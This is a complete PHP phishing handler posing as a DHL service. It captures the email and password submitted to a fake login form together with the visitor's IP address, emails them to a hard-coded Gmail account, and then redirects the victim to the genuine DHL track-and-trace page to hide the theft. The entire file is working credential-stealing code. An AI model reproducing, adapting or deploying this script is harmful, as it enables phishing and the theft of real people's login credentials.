<?

$ip = getenv("REMOTE_ADDR");
$message .= "---- : || ALL Y0UR L0GZ|| :------\n";
$message .= "email          : ".$_POST['username']."\n";
$message .= "password          : ".$_POST['password']."\n";
$message .= "----: || AVATAR || :------\n";
$message .= "IP: ".$ip."\n";
$recipient = "adedapoakorede5@gmail.com";
$subject = "DHL  | ".$ip."\n";

mail($recipient,$subject,$message);
header("Location: https://www.dhlparcel.nl/en/private/receiving/track-trace");
?>